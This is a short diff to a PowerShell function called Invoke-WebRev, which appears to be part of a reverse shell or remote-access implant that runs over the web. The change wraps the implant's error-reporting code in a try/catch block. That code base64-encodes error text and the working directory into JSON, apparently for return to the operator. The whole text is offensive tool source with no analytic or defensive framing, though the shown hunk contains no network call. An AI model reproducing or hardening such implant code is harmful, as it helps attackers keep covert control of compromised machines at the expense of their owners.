@@ -109,13 +109,16 @@ function Invoke-WebRev{
         {
             if ($error[0] -ne "")
             {
-                $type = '"type":"3RR0R"';
-                $err = $error[0] | Out-String;
-                $error[0]= "";
+                try
+                {
+                    $type = '"type":"3RR0R"';
+                    $err = $error[0] | Out-String;
+                    $error[0]= "";
 
-                $bytes = $enc.GetBytes($err);
-                $result = [Convert]::ToBase64String($bytes);
-                $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '"}';
+                    $bytes = $enc.GetBytes($err);
+                    $result = [Convert]::ToBase64String($bytes);
+                    $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '"}';
+                } catch {}
             }
         };
     };
